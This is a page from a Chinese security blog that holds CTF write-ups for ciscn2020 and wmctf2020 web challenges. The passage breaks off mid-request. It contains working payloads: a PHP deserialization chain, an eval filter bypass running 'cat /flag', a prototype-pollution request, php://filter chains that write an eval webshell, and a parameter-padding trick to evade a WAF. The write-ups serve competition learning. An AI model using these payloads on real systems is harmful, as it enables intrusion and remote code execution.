<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>ccreaterのblog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="ccreaterのblog">
<meta property="og:url" content="https://site.ccreater.top/page/3/index.html">
<meta property="og:site_name" content="ccreaterのblog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ccreaterのblog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2020-08-20T16:00:00.000Z" itemprop="datePublished">2020-08-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>

<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shell命令执行测试</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//读取文件测试</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//创建文件/文件夹测试</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//php命令执行测试</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>多次执行发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>

<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
<p>很简单利用字符串拼接绕过</p>
<p><code>&#123;if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)&#125;&#123;end+if&#125;</code></p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> trick;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick1 = <span class="string">&quot;INF&quot;</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick2 = <span class="number">1e1111</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$t</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">λ npm audit</span><br><span class="line"></span><br><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line"># Run  npm update set-value --depth 1  to resolve 1 vulnerability</span><br><span class="line"></span><br><span class="line">  High            Prototype Pollution</span><br><span class="line"></span><br><span class="line">  Package         set-value</span><br><span class="line"></span><br><span class="line">  Dependency of   set-value</span><br><span class="line"></span><br><span class="line">  Path            set-value</span><br><span class="line"></span><br><span class="line">  More info       https://npmjs.com/advisories/1012</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found 1 high severity vulnerability in 61 scanned packages</span><br><span class="line">  run `npm audit fix` to fix 1 of them.</span><br></pre></td></tr></table></figure>

<p>原型链污染，poc地址：<br><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<ul>
<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /Privilege HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4</span><br><span class="line"></span><br><span class="line">POST /DeveloperControlPanel HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">key=password4&amp;password=abc</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="cku8ky2y3003odnnfetl8gj5d" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-wmctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/03/wmctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-08-03T16:00:00.000Z" itemprop="datePublished">2020-08-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/03/wmctf2020/">wmctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="wmctf-2020"><a href="#wmctf-2020" class="headerlink" title="wmctf 2020"></a>wmctf 2020</h1><p>u1s1，这次比赛质量很高</p>
<h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题就很简单，因为flag就在/flag，直接包含拿到flag</p>
<h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>这题就很有意思了，搞了整整一天</p>
<p>一样的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>))</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次flag不在/flag，所以我们需要命令执行</p>
<p>因为这个php版本是7.0.33所以<code>string.strip_tags</code>这个过滤器不能用，不然的话可以利用这样的payload:<code>php://filter/write=string.strip_tags|dechunk/resource=%3f&gt;%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b</code></p>
<p>为啥不能用嘞，因为7.0.33版本有个bug，用<code>string.strip_tags</code>会出现segment fault</p>
<p>后来我就想到了，利用segment fault，php不会删除临时文件，所以就上传文件，然后爆破文件名，但是后来题目弄了个提醒：<code>no brute force</code> 心态裂开</p>
<p>于是我们得找其他的方法，</p>
<p>这下彻底没招了，只能去看源代码了，在分析代码的时候发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png" alt="image1550"></p>
<p>php会对filter进行urldecode，美滋滋那么payload出来了</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</span><br></pre></td></tr></table></figure>

<p>但是新的问题出现了，这个网站的中间件会ban<code>%25</code>，送出题人一句mmp。</p>
<p>跨过千山万水来到这里，结果还有新的拦路虎。</p>
<p>一般遇到服务器中间件拦截%25的时候，我们可以试试php与中间件对数据解析的差异来绕过，或者试试http请求走私，测试后发现两种都不行</p>
<p>服务器过滤了%25，测试下发现这是是针对参数值的，如把%25放到参数名那里就是很ok的，然后我们就知道他是针对参数检测的，如果参数过多它还能检测吗</p>
<p>于是有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/aaa/?a=&amp;b=&amp;c=&amp;d=&amp;e=&amp;f=&amp;g=&amp;h=&amp;i=&amp;j=&amp;k=&amp;l=&amp;m=&amp;n=&amp;o=&amp;p=&amp;q=&amp;r=&amp;s=&amp;t=&amp;u=&amp;v=&amp;w=&amp;x=&amp;y=&amp;z=&amp;A=&amp;B=&amp;C=&amp;D=&amp;E=&amp;F=&amp;G=&amp;H=&amp;I=&amp;J=&amp;K=&amp;L=&amp;M=&amp;N=&amp;O=&amp;P=&amp;Q=&amp;R=&amp;S=&amp;T=&amp;U=&amp;V=&amp;W=&amp;X=&amp;Y=&amp;Z=&amp;0=&amp;1=&amp;2=&amp;3=&amp;4=&amp;5=&amp;6=&amp;7=&amp;8=&amp;9=&amp;aa=&amp;ab=&amp;ac=&amp;ad=&amp;ae=&amp;af=&amp;ag=&amp;ah=&amp;ai=&amp;aj=&amp;ak=&amp;al=&amp;am=&amp;an=&amp;ao=&amp;ap=&amp;aq=&amp;ar=&amp;as=&amp;at=&amp;au=&amp;av=&amp;aw=&amp;ax=&amp;ay=&amp;az=&amp;aA=&amp;aB=&amp;aC=&amp;aD=&amp;aE=&amp;aF=&amp;aG=&amp;aH=&amp;aI=&amp;aJ=&amp;aK=&amp;aL=&amp;aM=&amp;aN=&amp;aO=&amp;aP=&amp;aQ=&amp;aR=&amp;aS=&amp;aT=&amp;aU=&amp;aV=&amp;aW=&amp;aX=&amp;aY=&amp;aZ=&amp;a0=&amp;a1=&amp;a2=&amp;a3=&amp;a4=&amp;a5=&amp;a6=&amp;a7=&amp;a8=&amp;a9=&amp;ba=&amp;bb=&amp;bc=&amp;bd=&amp;be=&amp;bf=&amp;bg=&amp;bh=&amp;bi=&amp;bj=&amp;bk=&amp;bl=&amp;bm=&amp;bn=&amp;bo=&amp;bp=&amp;bq=&amp;br=&amp;bs=&amp;bt=&amp;bu=&amp;bv=&amp;bw=&amp;bx=&amp;by=&amp;bz=&amp;bA=&amp;bB=&amp;bC=&amp;bD=&amp;bE=&amp;bF=&amp;bG=&amp;bH=&amp;bI=&amp;bJ=&amp;bK=&amp;bL=&amp;bM=&amp;bN=&amp;bO=&amp;bP=&amp;bQ=&amp;bR=&amp;bS=&amp;bT=&amp;bU=&amp;bV=&amp;bW=&amp;bX=&amp;bY=&amp;bZ=&amp;b0=&amp;b1=&amp;b2=&amp;b3=&amp;b4=&amp;b5=&amp;b6=&amp;b7=&amp;b8=&amp;b9=&amp;ca=&amp;cb=&amp;cc=&amp;cd=&amp;ce=&amp;cf=&amp;cg=&amp;ch=&amp;ci=&amp;cj=&amp;ck=&amp;cl=&amp;cm=&amp;cn=&amp;co=&amp;cp=&amp;cq=&amp;cr=&amp;cs=&amp;ct=&amp;cu=&amp;cv=&amp;cw=&amp;cx=&amp;cy=&amp;cz=&amp;cA=&amp;cB=&amp;cC=&amp;cD=&amp;cE=&amp;cF=&amp;cG=&amp;cH=&amp;cI=&amp;content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&amp;cJ=&amp;cK=&amp;cL=&amp;cM=&amp;cN=&amp;cO=&amp;cP=&amp;cQ=&amp;cR=&amp;cS=&amp;cT=&amp;cU=&amp;cV=&amp;cW=&amp;cX=&amp;cY